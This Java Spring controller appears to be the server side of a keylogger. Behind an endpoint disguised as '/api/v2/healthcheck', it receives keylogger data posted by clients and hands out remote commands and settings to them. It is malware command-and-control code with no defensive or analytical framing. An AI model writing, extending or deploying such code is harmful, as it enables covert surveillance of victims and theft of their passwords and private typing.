package com.klg.client.controller;

import com.klg.client.model.KeyloggerData;
import com.klg.client.model.SettingsResponse;
import com.klg.client.model.SyncedCommandResponse;
import com.klg.client.service.ClientService;
import lombok.RequiredArgsConstructor;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequiredArgsConstructor
@RequestMapping("/api/v2/healthcheck")
public class ClientController {

  private final ClientService clientService;

  @PostMapping
  public void keyloggerData(@RequestBody KeyloggerData keyloggerData) {
    clientService.keyloggerData(keyloggerData);
  }

  @GetMapping("/cmd")
  public SyncedCommandResponse getCommand() {
    return clientService.cmd();
  }

  @GetMapping("/settings")
  public SettingsResponse getSettings() {
    return clientService.settings();
  }
}
